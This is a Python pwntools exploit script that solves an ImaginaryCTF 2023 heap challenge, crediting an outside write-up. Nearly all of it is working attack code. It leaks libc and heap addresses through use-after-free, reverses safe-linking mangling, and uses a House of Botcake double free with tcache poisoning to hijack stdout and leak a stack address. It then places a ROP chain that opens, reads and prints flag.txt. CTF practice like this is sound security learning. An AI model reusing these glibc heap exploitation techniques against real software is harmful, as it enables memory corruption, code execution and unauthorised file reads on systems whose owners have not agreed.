#!/usr/bin/env python3

# type: ignore
# flake8: noqa

"""
Solution based on https://sekai.team/blog/imaginary-ctf-2023/mailman/
"""

from pwn import *

elf = context.binary = ELF("./vuln")
libc = ELF("./libc.so.6")


def start(argv=[], *a, **kw):
    host = args.HOST or 'ret2win.chal.imaginaryctf.org'
    port = int(args.PORT or 1337)
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}
io = start()


def mangle(pos, ptr):
    return (pos >> 12) ^ ptr


def alloc(idx, size, data):
    io.sendlineafter(b"> ", str(1).encode())
    io.sendlineafter(b"idx: ", str(idx).encode())
    io.sendlineafter(b"size: ", str(size).encode())
    io.sendlineafter(b"content: ", data)


def free(idx):
    io.sendlineafter(b"> ", str(2).encode())
    io.sendlineafter(b"idx: ", str(idx).encode())


def show(idx):
    io.sendlineafter(b"> ", str(3).encode())
    io.sendlineafter(b"idx: ", str(idx).encode())
    return io.recvline()


def reveal(ptr):
    mask = 0xfff << 36
    while mask:
        ptr ^= (ptr & mask) >> 12
        mask >>= 12
    return ptr


alloc(0, 0x410, b"huge")
alloc(1, 0x410, b"consolidation guard")
free(0)
libc_leak = u64(show(0).strip().ljust(8, p8(0)))
libc.address = libc_leak - 0x219ce0
assert libc.address & 0xfff == 0
log.info(f"{libc.address=:#x}")
free(1)

alloc(0, 0x30, b"aaaa")
alloc(1, 0x30, b"aaaa")
free(0)
free(1)

heap_leak = reveal(u64(show(1).strip().ljust(8, p8(0))))
heap_base = (heap_leak >> 12 << 12) - 0x1000
log.info(f"{heap_base=:#x}")

print("Cleaning tcaches + smallbins")
for i in range(7):
    alloc(15, 0x10, b'A')
for i in range(2):
    alloc(15, 0x30, b'A')
for i in range(7):
    alloc(15, 0x60, b'A')
for i in range(7):
    alloc(15, 0x70, b'A')
for i in range(5):
    alloc(15, 0xc0, b'A')
for i in range(2):
    alloc(15, 0xe0, b'A')
for i in range(6):
    alloc(15, 0x10, b'A')
alloc(15, 0x20, b'A')
alloc(15, 0x70, b'A')
alloc(15, 0x70, b'A')
alloc(15, 0x170, b'A')
alloc(15, 0x190, b'A')
alloc(15, 0x10, b'A')
alloc(15, 0x20, b'A')
alloc(15, 0x60, b'A')
alloc(15, 0x60, b'A')
alloc(15, 0x70, b'A')

# House of Botcake

for i in range(7):
    alloc(9 + i, 0x100, b"A")

alloc(6, 0x100, b"prev")  # prev chunk
alloc(7, 0x100, b"victim")  # victim chunk
alloc(8, 0x10, b"flag.txt\x00")  # padding to prevent consolidation

for i in range(7):
    free(9 + i)

free(7)  # add victim chunk into unsortedbin since tcachebins is full
free(6)  # add prev chunk into unsortedbin

# Now our prev and victim chunk is consolidated into one huge chunk inside
# unsortedbin

alloc(9, 0x100, b"A")  # free up one space inside tcachebins

# double free
free(7)  # add victim chunk into tcachebins

environ = libc.symbols["environ"]
stdout = libc.symbols["_IO_2_1_stdout_"]

payload = b"B" * 0x108
payload += p64(0x111)  # preserve victim chunk size
# 0x2cc0 is calculated from the victim fd field address - heap_base
payload += p64(mangle(heap_base + 0x2cc0, stdout))

# this alloc splits the consolidated unsortedbin chunk
# the result of this alloc is an overlapping chunk (prev + victim metadata)
# this payload poisons victim's fd to control future allocated chunk address
# to be the address of _IO_2_1_stdout_
alloc(6, 0x120, payload)

alloc(7, 0x100, b"A")

payload = p64(0xfbad1800)      # flags
payload += p64(0)              # read_ptr
payload += p64(0)              # read_end
payload += p64(0)              # read_base
payload += p64(environ)        # write_base
payload += p64(environ + 0x8)  # write_ptr
payload += p64(environ + 0x8)  # write_end
payload += p64(environ + 0x8)  # buf_base
payload += p64(environ + 0x8)  # buf_end

# chunk allocated at stdout
alloc(1, 0x100, payload)

stack_leak = u64(io.recv(8))
log.info(f"{stack_leak=:#x}")

flag_addr = heap_base + 0x2dd0
output_buf = flag_addr + 0x100

rop = ROP(libc)
rop.call('syscall', [2, flag_addr, 0, 0])
rop.call('syscall', [0, 3, output_buf, 0x100])
rop.call('syscall', [1, 1, output_buf, 0x100])

free(6)  # overlapping prev chunk
free(7)  # victim chunk

payload = b"B" * 0x108
payload += p64(0x111)

# calculate offset between stack_leak and _IO_getline_info saved rip
payload += p64(mangle(heap_base + 0x2cc0, stack_leak - 0x198))

alloc(6, 0x120, payload)
alloc(7, 0x100, b"A")
payload = b"C" * 8
payload += rop.chain()
alloc(1, 0x100, payload)

io.interactive()
